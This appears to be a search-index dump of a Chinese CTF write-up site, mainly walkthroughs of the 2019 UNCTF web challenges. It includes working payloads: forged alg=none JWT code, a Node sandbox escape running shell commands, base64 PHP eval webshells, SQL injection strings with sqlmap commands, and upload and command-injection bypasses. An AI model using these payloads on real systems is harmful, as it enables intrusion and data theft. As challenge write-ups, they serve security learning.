{"./":{"url":"./","title":"介绍","keywords":"","body":"站点介绍 宗旨： 本站致力于收集各类CTF题的Writeup，以方便各位师傅们进行学习。 官方群 点我加群 :)群号: 937886410 感谢： 在此鸣谢对本站点提供帮助的朋友们(Issue、分享wp等)。以下排名不分前: ID 贡献 ID 贡献 glzjin CDN支持 西瓜_Melon WP提供 札克利 WP提供 * * 说明： 本站所有文章均来源于网上搜索查询和网友分享，如果您有更好的Writeup想分享，欢迎email我的邮箱(asp-php@foxmail.com)，如果损害了您的利益，请尽快联系我，确保在24小时之内进行删除。 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:50:01 0 issues reported "},"types/":{"url":"types/","title":"按类型区分","keywords":"","body":"按类型区分 按照赛题区分 类型 数量 网上练习题 2 官方赛事题 14 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:47:08 0 issues reported "},"types/web.html":{"url":"types/web.html","title":"网上练习题","keywords":"","body":"网上练习题 按照添加时间倒序排序 添加时间 名称 2019-05-03 旧Bugku_Web部分 2019-04-15 实验吧web部分 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-03 01:08:06 0 issues reported "},"types/comp.html":{"url":"types/comp.html","title":"官方赛事题","keywords":"","body":"官方赛事题 按照添加时间倒序排序 添加时间 名称 2019-10-30 2019UNCTF 2019-07-20 2019上海神盾杯 2019-07-19 2017湖湘杯 2019-06-24 2019SCTF 2019-05-27 2019强网杯 2019-05-25 2019ISCC 2019-05-02 2019*CTF 2019-04-27 2017HCTF 2019-04-26 2018第二届强网杯线上赛Web 2019-04-26 2018DDCTF滴滴夺旗赛 2019-04-18 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:47:00 0 issues reported "},"years/":{"url":"years/","title":"按年份区分","keywords":"","body":"按年份区分 将WP按年份区分可让我们更好的去猜测出题人的命题思路。 时间 数量 2019-2020 9 2018-2019 2 2017-2018 3 2016-2017 0 2015-2016 0 ????-2015 2 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:46:50 0 issues reported "},"years/2020.html":{"url":"years/2020.html","title":"2019-2020","keywords":"","body":"2019-2020 2019-2020的CTF 添加时间 名称 2019-10-30 2019UNCTF 2019-07-20 2019上海神盾杯 2019-06-24 2019SCTF 2019-05-27 2019强网杯 2019-05-25 2019ISCC 2019-05-02 2019*CTF 2019-04-22 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2019西湖论剑预选赛 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:46:39 0 issues reported "},"years/2019.html":{"url":"years/2019.html","title":"2018-2019","keywords":"","body":"2018-2019 2018-2019年的CTF 添加时间 名称 2019-04-26 2018第二届强网杯线上赛Web 2019-04-26 2018DDCTF CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-04-28 17:05:30 0 issues reported "},"years/2018.html":{"url":"years/2018.html","title":"2017-2018","keywords":"","body":"2017-2018 2017-2018年的CTF 添加时间 名称 2019-07-19 2017湖湘杯 2019-04-27 2017HCTF 2019-04-16 2017全国大学生信息安全竞赛 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-19 19:38:00 0 issues reported "},"years/2017.html":{"url":"years/2017.html","title":"2016-2017","keywords":"","body":"2016-2017 2016-2017年的CTF 添加时间 名称 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-04-28 17:05:11 0 issues reported "},"years/2016.html":{"url":"years/2016.html","title":"2015-2016","keywords":"","body":"2015-2016 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-04-28 17:05:04 0 issues reported "},"years/2015.html":{"url":"years/2015.html","title":"????-2015","keywords":"","body":"????-2015 未知年份及2015年(包含)之前的CTF 添加时间 名称 2019-05-03 旧Bugku_Web部分 2019-04-15 实验吧web部分 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-03 01:08:22 0 issues reported "},"difficult/":{"url":"difficult/","title":"按难度区分","keywords":"","body":"按难度区分 按照难度区分，更方便不同层次的师傅学习 难度 数量 较易 3 中等 8 较难 5 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:47:25 0 issues reported "},"difficult/easy.html":{"url":"difficult/easy.html","title":"相对简单","keywords":"","body":"相对简单 按照添加时间倒序排序 添加时间 名称 2019-05-25 2019ISCC 2019-05-03 旧Bugku_Web部分 2019-04-15 实验吧web部分 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-25 09:29:35 0 issues reported "},"difficult/mid.html":{"url":"difficult/mid.html","title":"难度中等","keywords":"","body":"难度中等 按照添加时间倒序排序 添加时间 名称 2019-10-30 2019UNCTF 2019-07-20 2019上海神盾杯 2019-07-19 2017湖湘杯 2019-04-26 2018DDCTF滴滴夺旗赛 2019-04-22 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 00:47:16 0 issues reported "},"difficult/diff.html":{"url":"difficult/diff.html","title":"难度较大","keywords":"","body":"难度较大 按照添加时间倒序排序 添加时间 名称 2019-06-24 2019SCTF 2019-05-27 2019强网杯 2019-05-02 2019*CTF 2019-04-27 2017HCTF 2019-04-26 2018第二届强网杯线上赛Web CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-06-24 20:55:23 0 issues reported "},"articals/all.html":{"url":"articals/all.html","title":"目前已收录","keywords":"","body":"目前已收录 时间按照新旧排序，欢迎提交好的Writeup 时间 名称 2019-10-30 2019UNCTF 2019-07-20 2019上海神盾杯 2019-07-19 2017湖湘杯 2019-06-24 2019SCTF 2019-05-27 2019强网杯 2019-05-25 2019ISCC 2019-05-03 旧Bugku_Web部分 2019-05-01 2019*CTF 2019-04-27 2017HCTF 2019-04-26 2018第二届强网杯线上赛Web 2019-04-26 2018DDCTF 2019-04-22 2019全国信安赛 2019-04-18 2019DDCTF 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 2019-04-15 实验吧web部分 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-10-31 01:12:39 0 issues reported "},"articals/2019unctf.html":{"url":"articals/2019unctf.html","title":"2019UNCTF","keywords":"","body":"2019UNCTF 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 暂无 网上公开WP： 暂无 本站备份WP： 感谢作者：2019unctf提供 WEB Arbi 第一步 首先题目拿到是黑盒环境，注册账号后登陆，发现img标签src属性有个接口存在ssrf 题目提示了python3 http.server 所以可以猜测服务器9000端口开了个http.server可以读取文件 上传头像后 会通过ssrf去请求upload目录里的图像 ，直接通过web访问upload目录也可以访问图像，可以断定 http.server的根目录就是web目录，所以可以读取源码 但是ssrf判断了用户名和url必须匹配，所以通过注册恶意用户名，来绕过接口判断，来读取任意文件 PS： 我这里修改了http.server的源码不能列目录，所以注册/等列目录的文件名是不行的 由于X-Powered-By 看出后端采用express开发，web应用下应存在package.json文件 注册 ../package.json? 用户，通过接口读取到了package.json文件 得到提示1，flag在根目录/flag下 第二步 package.json 显示主入口为mainapp.js，所以继续注册读取mainapp.js文件， 发现路由在 /routers/index.js文件 继续读取 为了让师傅们不这么恶心的做题，我直接在放了个源代码的zip在一个路由上， 读取 /routers/index.js 可以看到有个 VerYs3cretWwWb4ck4p33441122.zip 路由 直接在web上访问即可下载源代码，从而避免重复无用的做题步骤。源代码文件和题目环境文件完全一致 除了部署后动态生成的sessions文件外。 第三步 然后就是白盒审计，可以发现注册登录功能采用了jwt认证，这里我参考了ångstromCTF 2019的 Cookie Cutter题目 认证过程是，每个人拥有自己独立的jwt secret 并且存在于服务端一个列表中，并且不同用户secret列表对应的id存储在了jwt中，登陆的时候会直接从jwt token中读取id 然后通过列表获取secret 进行解密，这里有个trick，node的jsonwebtoken 有个bug，当jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 又因为服务端 通过 var secret = global.secretlist[id]; jwt.verify(req.cookies.token,secret); 解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin # pip3 install pyjwt import jwt token = jwt.encode({\"id\":-1,\"username\":\"admin\",\"password\":\"123456\"},algorithm=\"none\",key=\"\").decode(encoding='utf-8') print(token) 第四步 成为admin后，就可以访问admin23333_interface接口 审计可以发现，这是一个读取文件的接口 这里用到了express的特性，当传入?a[b]=1的时候,变量a会自动变成一个对象 a = {\"b\":1} 所以可以通过传入name为一个对象，避开\b进入if判断 从而绕过第一层if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);的白名单过滤 第二个过滤是 判断filename 不能大于3,否者会过滤.和/,而读取flag需要先目录穿越到根目录 而../就已经占了3个字符，再加上flag肯定超过限制 这时候可以换个思路，length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而express 中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&a=456 解析后 a = [123,456]，所以最终组合成 /admin23333_interface?name[filename]=../&name[filename]=f&name[filename]=l&name[filename]=a&name[filename]=g bypass 1） 打开浏览器，访问目标主机，发现源代码 2） 可以发现可以命令执行但是waf禁用了大部分符号，只能执行 file 命令，考虑如何bypass，发现误写反斜杠匹配模式，\\\\|\\n会被解释为匹配竖线与换行符的组合,所以可以直接用%0a进行命令注入，最后在bypass的时候由于过滤了bin，以及grep，可以用/???/gr[d-f]p 的形式绕过，最后用+ 绕过空格过滤 3） 最后payload见下图 CheckIn 原理知识 1） 远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。 2） 远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。 3） 远程执行代码漏洞会使得攻击者在用户运行应用程序时执行恶意程序，并控制这个受影响的系统。攻击者一旦访问该系统后，它会试图提升其权限。 解题过程 1）打开浏览器，访问目标主机，可以看到界面如下图1所示： 图1 web界面 2）分析js代码可以得知还有calc的功能，如下图2所示： 3）从calc的源码可以看到，问题出在下面的eval函数上，导致了RCE远程代码执行漏洞： 4）想要执行命令需要先绕过nodejs的vm模块，使用this.constructor.constructor（Object 类的 constructor 是外层的 Function 类）来完成逃逸，从而利用rce漏洞来读取flag文件，payload关键如下所示 '(new this.constructor.constructor(\"return this.process.mainModule.require;\"))()(\"child_process\").execSync(\"cat /flag\").toString();'; 5）执行exp.js结果如下图所示： CheckInA 原理知识 1） Node.js 就是运行在服务端的 JavaScript。Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。 解题过程 1）打开浏览器，访问目标主机，可以看到界面如下图1所示： 2）由界面可知这是一个聊天室，想要发言需要起一个nickname： 3）盲测或者分析js代码，我们可以得知，输入/help后可以查看指令，发现需要输入/more查看更多指令,发现有/flag指令 4）输入/flag，得到flag Do you like xml 原理知识 1） XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。 解题过程 1）打开浏览器，访问目标主机，发现提示flag in this pic图片提示。 2）根据图片名hex.png以16进制或txt格式打开hex.png图片发现flag位置。 3） 根据weak password提示，使用admin登录用户名密码，显示登陆成功，但无其他响应。 4） 使用burp抓包发现xxe漏洞，利用xxe漏洞和php://filter伪协议读取flag.php文件，得到base64加密的字符串。 5） base64解密，得到flag。 easy_file_manage 原理知识 第一个点是逻辑出现错误，先修改再判断了。 第二个点是有些CMS 会出现的问题，这个是比较简单的，比较难的可以参考： https://wizardforcel.gitbooks.io/php-common-vulnerability/content/58.html?tdsourcetag=s_pcqq_aiomsg解题过程 首先打开网页 正常注册登录后： 有提示看看 robots 文件，看看： 提示了两个备份文件，下载下来看看： 首先看看 download.php： 功能看起来像是查询数据库，拿到filename 后下载出来。其中还判断了user_id 。 再看看rename.php 这里首先是更改了数据库，再检查后缀，所以我们可以通过这个读取任意文件，但是有判断不能读取 config 和 flag。 再看看 flag.php~ 这里是要登陆 user_id 是 99999... 的，显然不可能，我们可以看看check_login 这个函数。尝试读取 function.php。 首先上传一个正常的图片： 改名，这里先记住 f_id： 会提示出错，但此时数据的filename字段已经被修改了，我们下载的时候是从数据库中查询出来的，然后访问 download.php 带入进 f_id： 下载下来后查看check_login 函数: 这里调用了 decrypt_str 解 $_COOKIE[user] ，看看这个函数： 这两个函数，一个加密一个解密，大致就是将密钥和字符串进行一些简单的运算。 这是可以破解的，我们只要知道明文和密文，就能解出密钥了，我们再看看 login.php; Id的话，在首页有显示出来： 从 COOKIE 中把密文拿出来，尝试破解一下密钥： 这里要先urldecode 一次，因为 进入 _COOKIE 时 php 好像自动把 %编码了一次，这里的解密函数直接用function.php 的即可： 我们把明文当作密钥，这里要先 serialize 一下，因为加密时对明文 serialize 了。 这样就可以解密出KEY了，因为加密时是循环取 KEY 的值，所以开始重复时就是 KEY了。 这里的 SECRET_KEY 应该时 THIS_KEY。根据 flag.php~的提示 ，我们加密一个 id 是 99999999999999999 的，还有第二条件是存在 flag_pls ： 还要再 urlencode 一次，放进 $_COOKIE 里就行了。 先不替换访问flag.php 试试： 替换 $_COOKIE 后： easy_pentest 原理知识 1.存在waf拦截以下几种： php标记: php函数: base64_decode，readfile，convert_uuencode，file_get_contents 关键字: php:// 2.disable_function禁用了以下函数： pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,passthru,exec,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,system,mail,error_log,move,copy,unlink 3.需要一个safe_key 来让waf允许参数传入，否则所有参数都拒绝接收。 解题过程 1.获取safe_key 获取safe_key来允许参数传入通过访问发现跳转到一个页面，显示403表明缺少safe_key来通过安全验证，页面如下图 Tp存在日志规律，请求都会记录在日志中，通过编写EXP来遍历所有可能存在的日志 EXP代码如下： 执行exp脚本，发现存在02.log日志 打开日志可以看到记录了一条请求，通过GET方式请求且携带参数名为safe_key 值为 easy_pentesnt_is_s0fun 如下图 携带safe_key 再去访问public/index.php 发现跳转到了安全页面可知过了waf的安全验证。如图 2.绕过限制来利用TP5 RCE漏洞 常见的tp5rce利用为 写日志，包含日志。写session，包含session。而这两种方式在这里都不可用，因为waf对 所以我们这里通过变形来绕过，利用base64编码与php://filter伪协议，通过inlcude方法进行包含，可以利用php://filter/read=convert.base64-decode/resource=/var/www/html/runtime/temp/用户session名的方式进行解码。 然而session里面还有其他字符串，为了让传入的webshell能够被正确解码，我们需要构造合适的字符串。例如： abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab 前后两个ab是为了满足shellcode前后两段字符串来被解析，可以fuzz判断需要加几个来凑满四个字节保证shellcode正常解析。 但是waf拦截了php等关键字，所以还需要绕过。filter其实是可以传递多个的，同时参数为参数引用。可通过strrev反转函数来突破限制。 3.利用 第一步通过设置session，将webshell写入到session中在包含利用，payload为： abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab 如图： 第二步通过webshell列出home目录，payload为： var_dump(scandir(\"/home\")); dmFyX2R1bXAoc2NhbmRpcigiL2hvbWUiKSk7 获取到home目录底下的flag文件名字，如图： 第三步读取flag，payload为： echo(readfile(\"/home/flag_1sh3r3.txt\")); ZWNobyhyZWFkZmlsZSgiL2hvbWUvZmxhZ18xc2gzcjMudHh0IikpOw== 如图： 4.通过exp获取flag 执行get_flag.py , 传入网站地址和端口。 例如python get_flag.py 192.168.232.144:88 运行后获取到flag 如图： 参考 Phithon：https://www.leavesongs.com/PENETRATION/php-filter-magic.html 水泡泡：https://xz.aliyun.com/t/6106 easy_sql_injection 原理知识 改自ThinkPHP 的历史漏洞 解题过程 首先打开首页： 发现有源码，下载。 首先是 index： 发现调用了 Db类的一些操作，看看 Db： 首先时buildSql 函数，这应该是构建语句的函数，进去看看： ParseWhere，继续跟入： 这里关键是parseWhereItem 函数，进去看看： 简单的分析一下：这里的 $val 是我们可控的值，可以是一个数组。如果是数组，is_scalar 就会返回 false，就不如进入 bind了。这个bind是 pdo的预处理，然后下面会根据 $exp 的值执行了一些操作，这里 $exp 也是我们可控的值，所以我们可以跟几个函数看看有没有注入的地方： 分析后我们会看见，大部分函数都在函数内有绑定参数，但是有一个函数： 这里直接将 $field2 拼接进了字符串中，可能会导致注入。 我们试试看，回到 index.php中： 传入 keyword：keyword[]=column&keyword[1][]==&keyword[1][]=abcd%27 在本地实验一下，可以输出一下sql语句： 可以看到这里被 ` 包裹住了，我们可以逃逸出来，我们传入： keyword[]=column&keyword[1][]==&keyword[1][]=abcd`) union select 1,2%23 这里 abcd 因为被 反引号包裹会被作为一个字段，所以要用一个已经存在的字段，否则会报错，我们可以猜一个字段名，比如id。 改一下语句，改成：id`) union select 1,sleep(3)%23 延时成功，证明可以使用盲注，我们可以上 sqlmap了： 执行语句：python sqlmap.py -u \"http://127.0.0.1/?keyword[]=column&keyword[1][]==&keyword[1][]=id\\`) union select 1,2*%23\" 然后加上 --current-db 得出当前数据库为 haha。 加上 -D haha --tables 跑出表名，发现存在 flag 表。 最后加上参数：-D haha -T flag --dump 跑出flag： easyphp 预备知识 1） 通过管道执行命令绕过waf 解题过程 1）打开浏览器，访问目标主机，审计源码 2）提交如下payload system(“ ls;cat”); 发现flag文件，继续提交如下payload system(“\\ 使用脚本循环上传，并访问使用脚本不间断获取返回文件 名并使用脚本访问该文件以便获得稳定的页面 EasyXSS 预备知识 1） 由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以在页面上插入 XSS 语句。 2） 后端程序未关闭调试模式，可以将前端发送的数据回显出来。 解题过程 步骤： 打开靶机，是这样一个页面。 随意测下，页面有 xss。 题目题面里有说 flag 在 httponly 的 cookie 里，那么就来查找一下有什么页面可以利用的。 F12 看一下每个页面发的 ajax 请求。 这个页面似乎可以利用，不带 id 参数打开，调试信息里有 Cookie 信息。 再来看看页面的 ACL 头，可以带着 Cookie 发 XHR 请求。 然后就来构造一个 XHR 请求的 Payload 来利用这个页面拿 flag 吧。 打过去，flag 到手。 GoodJava 前言 由于之前没怎么写过Java，此题可能有些bug，但对于拿flag影响不大，还请师傅们见谅 此题参考了最近的TMCTF，经过了改编 加大了难度 原题是用原生Servlet编写 此题改写成了Springboot，并且在第一步加了过滤，第二步考点直接换成了Java命令执行绕过（改动很大） 解题过程 前序步骤 题目会提供一个Jar包 用idea打开反编译后审计源码 找到Controller 第一步 源码可知一共有两个路由 第二个路由需要输入secret密钥才能访问，而secret存在在服务器/passwd文件中 可以猜测第一个路由就是获取密钥文件的功能，跟进可以发现OIS类继承了ObjectInputStream，把POST数据传入OIS构造方法，而然后ois.readObject()则是反序列化操作 但是resolveClass方法限制了被反序列化的类只能是com.unctf.pojo.Man类 查看Man类，可以发现重写了readObject方法，这是Java反序列化的魔术方法，审计一下很容易发现XXE，根据代码构造即可 需要注意一下本地构造时serialVersionUID必须一致，此值代表了对象的版本或者说id，值不一致反序列化操作会失败 这里有个小考点，这里限制了xml数据不能含有file（大小写），而我们需要读取/passwd 这里有个trick，Java里面有个伪协议netdoc，作用和file一致，都是读取文件，所以这一步很简单，把file换成netdoc即可 注意一下本地构造包名也必须一致哦，不仅仅是类名一致就行 Man类加一个writeObject即可 详细步骤可以看看https://github.com/p4-team/ctf/tree/master/2019-09-07-trendmicro-quals/exploit_300 exp output 第二步 然后就是第二步，考点是代码执行绕过 这里有个SPEL注入，可以构造任意类，但是同样代码过滤了Runtime|ProcessBuilder|Process 这三个Java中执行命令的类，题目提示必须执行命令才能拿到flag，然后Java又是强类型语言，很多操作不像php那么动态，所以这一步可能会难住很多人 然后这里有个trick，java内部有个javascript的解析器，可以解析javascript，而且在javascript内还能使用java对象 我们就可以通过javascript的eval函数操作 T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"js\").eval(\"xxxxxxxxx\") 由于不能使用关键字，我们可以通过字符串拼接来 juke.outofmemory.cn/entry/358362 exp里面也有对应的转换脚本 exp output happyphp file = \"php://filter/read=convert.base64-encode/resource=files_upload_api.php\"; echo urlencode(serialize($a)); echo \"\"; $a = new Server; $a->file = \"LXJuploadspaht/shell.jpg\"; //你上传的shell echo urlencode(serialize($a)); K&K战队的老家 原理知识 1） 由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。 2） SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。 3） PHP是弱类型语言 4） PHP魔术方法可以通过反序列化进行触发 解题过程 打开浏览器，访问目标主机，发现登录框 构造万能密码 ‘||1||’登录 发现/home.php?m=debug无法访问 通过m参数利用php伪协议绕过过滤读取题目源代码 通过代码审计可知access.php和flag.php，同时发现备份文件access.php.bak 通过代码审计构造反序列化漏洞利用 exp.php forbidden = $obj; $obj->ob = $obj; $obj->funny = $str1; $str = serialize($obj); echo cookie_encode($str); ?> 运行exp.php构造cookie &144&16a&15f&121&13f&159&13a&15b&14a&147&13a&121&14a&169&139&126&13e&16a&160&127&153&16a&15f&122&13f&159&13a&15a&151&137&129&166&153&122&145&159&13f&123&13d&126&13e&144&15f&159&13d&15d&136&158&149&147&135&159&13f&123&13d&126&13d&15a&15f&159&151&147&141&159&13f&122&15b&126&13d&15a&164&16a&13f&15a&157&126&139&15e&146&16a&14a&148&13a&165&149&147&121&15c&139&15a&164&16a&13f&15a&153&126&139&15d&142&15c&149&15e&146&15e&14a&148&139&159&13f&123&13d&126&13f&144&15f&159&14a&15d&129&169&149&15d&15c&15b&14a&137&146&165&139&15a&164&169&13f&15a&135&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&169&13f&159&13a&166&149&159&139&127&153&15a&15f&168&13f&123&13d&126&13e&144&15f&159&14a&15e&146&165&152&15e&15b&159&13f&123&13d&126&13e&144&149&126&139&15b&128&126&13e&16a&15f&159&153&122&146&16a&153&122&15c&166&152&159&139&126&13d&144&160&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&135&167&13f&159&139&16a&14a&147&13e&143&14a&145&163&15d&151&122&146&125&139&15a&164&129&139&15a&164&129 得到flag NSB_Login 原理知识 1） 管理员使用了弱密码，就是那么简单。 解题过程 步骤： 打开靶机，是这样一个页面。 随便输入下，提示用户不存在。 输入用户名 admin，提示密码错误。 查看页面源代码，发现有提示 rockyou，应该是使用了 rockyou.txt 这个非常有名的字典。 编写 Python 脚本，读入 rockyou 字典，运行。 得到 flag。 NSB_Reset_Password 原理知识 1） 找回密码时先提交并储存了用户名，然后验证了验证码之后储存了一个验证已通过的标志，最后提交新密码时再判断是否通过验证再重置指定用户密码。 2） 在验证通过，还没有提交新密码时如果再回到一开始提交用户名时即可覆盖储存用户名，再提交密码时导致可以重置任意用户密码。 解题过程 步骤： 打开靶机，是这样一个页面。 有注册，那就先来注册个用户看看。 然后登录，提示要干管理员。 那么就来找回密码试试。 到邮箱可以看到验证码，填上。 然后再打开一个新的找回密码页面，输入用户名 admin，点击找回密码，让 admin 来覆盖 session 中要重置密码的用户名。 再回到刚才那个重置密码的页面，重置密码为 123456。 用用户名 admin，密码 123456登录得到 flag。 Simple_Calc_1 原理知识 1） 由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。 2） SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。 3） 如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。 解题过程 步骤： 打开靶机，是这样一个计算器。 看下关于信息，这里有个次数显示。 F12 看下，发现有个 backend 请求。 然后尝试构造 X-Forwarded-For 来伪造访客 IP，发现是可以伪造成功的。 127.0.0.1: 第一次访问： 第二次访问： 127.0.0.3： 然后就可以尝试在这里尝试注入了。 多番测试之后，发现伪造 IP 为 127.0.0.3 ‘ or ‘1’=’1 之后，功能正常，说明此处有注入点。 所以我们就可以直接用sqlmap来跑出数据了，当然 flag 也可以直接拿到了。 Simple_Calc_2 原理知识 1） 由于开发者直接将参数作为后端命令执行时的变量传入，导致了命令执行。 2） SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。通过此即可调用特定的应用程序来提权。 解题过程 步骤： 打开靶机，是这样一个计算器。 F12打开，然后随意点一下计算器看看，比如算一下 1+1 = 2。 网络请求看下，发现有个 calc.php请求。 来自己构造一个包试试能不能 rce。 可以，那么就可以直接读flag.txt 试试。 不能读，来看看 flag.txt 的权限。 得找个带 suid 的可执行文件来读，来搜一下有哪些文件可用。 tac 可用，那就直接用这个来读吧。Flag 到手~ simple_upload 解题过程 步骤： 打开靶机，就会出现源码 分析功能后,我们需要上传一个webshell到服务器上 题目考点可以从源码中看到,首先是mime的类型检测 我们使用burp 获取中间的包进行修改即可绕过检测 但是这样会有hacker的提示,可以看到源码中,对上传文件的内容进行了检测,对于此我们可以采用\\这种标胶进行绕过(因为实验环境是在php 5.6下进行的) 可以看到已经绕过了\\ 这里又会遇到一个问题就是我们不能让他保存为php的后缀, 所以回到源码中发现他以数组的形式(这一句话$file_name = reset($file) . '.' . $file[count($file) - 1];)进行判断,且最后以move_uploaded_file函数进行上传.我们应该知道这个函数会递归删除文件最后的/.字符串(例如1.php/.会被转化为1.php,而且是递归的),所以我们的思路就清楚了因为file_name 等于reset($file)加一个. 和$file[count($file) - 1]组成的,所以我们让reset($file)为xxx.php/,再让$file[count($file) - 1]为空,这样我们的文件名就能组成为xxx.php/.最后会删除/.所以就能保存为php格式了 再bp中按照这样输入,就可以发现上传成功了 然后访问上传的文件就可以 使用木马,post请求即可得到flag simple_web 原理知识 1） Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了 2） 简单的命令注入 解题过程 步骤： 打开靶机，出现这样一个页面 根据提示后,考虑存在robots.txt文件 访问robots.txt出现一下内容 继续访问getsandbox.php,得到一下内容. 了解大意后,发现是一个得到了一个沙盒,然后发送get请求reset=1就能重置沙盒 接着访问属于自己的沙盒,发现如下代码 审计之后,发现会写入一个content.php的文件内,但是我们输入的字符都会被addslashes添加转义,从而保证安全 规则大概如下‘->/’,/->//,所以我们需要采用特别的构造技巧,payload如下:?content=aaa\\';\\@eval($_POST[x]);;// 如此构造后我们content.php的内容就会变为如下的内容 10 .使用菜刀链接,从而就在根目录下能得到flag smile doge 原理知识 1） CRLF 注入漏洞， 是因为 Web 应用没有对用户输入做严格验证， 导致攻击者可以输入一些恶意字符。 攻击者一旦 向请求行或首部中的字段注入恶意的 CRLF， 就能注入一些首部字段或报文主体， 并在响应中输出， 所以又称为 HTTP 响应拆分漏洞（HTTP Response Splitting） 。 2） SSTI 和常见 Web 注入(SQL 注入等)的成因一样， 也是服务端接收了用户的输入， 将其作为 Web 应用模板内容的 一部分， 在进行目标编译渲染的过程中， 执行了用户插入的恶意内容。 解题过程 1） 打开浏览器， 访问目标主机， 可以看到页面只有一个输入框， 简单测试可以看到输入的内容基本都原样输出了， 且默认页面输出为“Hello gugugu!” ， 输入“http://127.0.0.1” 后发现输出的内容为“Hello Hello gugugu!!” 可以看到内容发生了嵌套， 说明可能存在 SSRF 2） 页面提示代号 9527， 于是输入“http://127.0.0.1:9527/” ， 发现同样出现了内容嵌套， 且内容为“Hello No.9527!” ， 可以判断出内网中 9527 端口存在一个服务 3） 用 Dirsearch 等工具能够很轻易地扫到备份文件： http://127.0.0.1/backup/.index.php.swp 下载下来用 vim -r .index.php.swp 恢复源码 4） 